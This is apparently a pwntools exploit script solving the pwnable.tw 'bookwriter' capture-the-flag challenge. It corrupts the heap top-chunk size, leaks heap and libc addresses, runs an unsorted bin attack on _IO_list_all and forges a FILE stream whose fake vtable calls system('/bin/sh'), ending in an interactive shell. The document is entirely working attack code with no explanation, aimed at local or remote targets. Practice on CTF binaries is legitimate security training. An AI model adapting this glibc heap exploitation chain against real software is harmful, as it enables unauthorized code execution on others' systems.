#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("bookwriter_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

local = True 
if local:
    p = process("./bookwriter_patched")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./bookwriter_patched', checksec=False)

def add_a_page(size, data):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b':', str(size))
    p.sendafter(b':', data)
    log.info('======= add =======')

def view_page(idx):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b':', str(idx))
    log.info('======= view =======')

def edit_page(idx, data):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b':', str(idx))
    p.sendafter(b':', data)
    log.info('======= edit =======')

def author(some, data):
    p.sendlineafter(b'Your choice :', b'4')
    p.sendlineafter(b'(yes:1 / no:0)', str(some))
    if some == 1:
        p.sendafter(b':', data)

def leave():
    p.sendlineafter(b'Your choice :', b'5')

##################################################################
puts_got = 0x601fa8
puts = 0x400700
page_addr = 0x6020A0
page_size_addr = 0x6020E0
##################################################################

p.sendlineafter(b'Author :', cyclic(0x40))

add_a_page(0x18, b'a'*0x18)
sleep(0.3)
edit_page(0, b'A' * 0x18)
edit_page(0, b'\x00' * 0x18 + b'\xe1\x0f\0')

##################
# Leak_heap_addr #
##################

p.sendlineafter(b'Your choice :', b'4')
p.recvuntil(b'paaa')
heap = int.from_bytes(p.recvuntil(b'\n').rstrip(b'\n'), 'little')
p.sendlineafter(b'(yes:1 / no:0)', b"0")

##################
# Leak_libc_base #
##################

add_a_page(0x1000, b'a') # 1 0x1000 > 0xfe1
add_a_page(0x40, b'a'*8)  # 2
view_page(2)
p.recvuntil(b'a'*8)
libc.address = int.from_bytes(p.recv(6),"little") - 3948936
log.info('Libc_base:        ' + hex(libc.address))
malloc_hook = libc.address + 0x3c3b10
free_hook   = libc.address + 0x3c57a8


for i in range(0x3, 0x9):
      add_a_page(0x20, str(i) * 0x20)
    
vtable_addr = heap + 0x248

payload = 0x170 * b'\x00'

fake_stream = b'/bin/sh\x00' + p64(0x61)
fake_stream += p64(0) + p64(libc.sym['_IO_list_all'] - 0x10) # unsorted bin attack
fake_stream = fake_stream.ljust(0xa0, b'\x00')
fake_stream += p64(heap + 0x250)
fake_stream = fake_stream.ljust(0xc0, b'\x00')
fake_stream += p64(1) + 2 * p64(0) + p64(vtable_addr)

payload += fake_stream
payload += p64(2)
payload += p64(3)
payload += p64(libc.sym['system'])

edit_page(0, payload)

##################################################################
log.info('\n')
log.info('          Func_addr         ')
log.info('Libc_IO_list_all: ' + hex(libc.sym['_IO_list_all']))
log.info('Libc_system:      ' + hex(libc.sym['system']))
log.info('Heap_addr:        ' + hex(heap))
log.info('Fake_stream:      ' + hex(heap - 0x170))
log.info('\n')
##################################################################

p.interactive()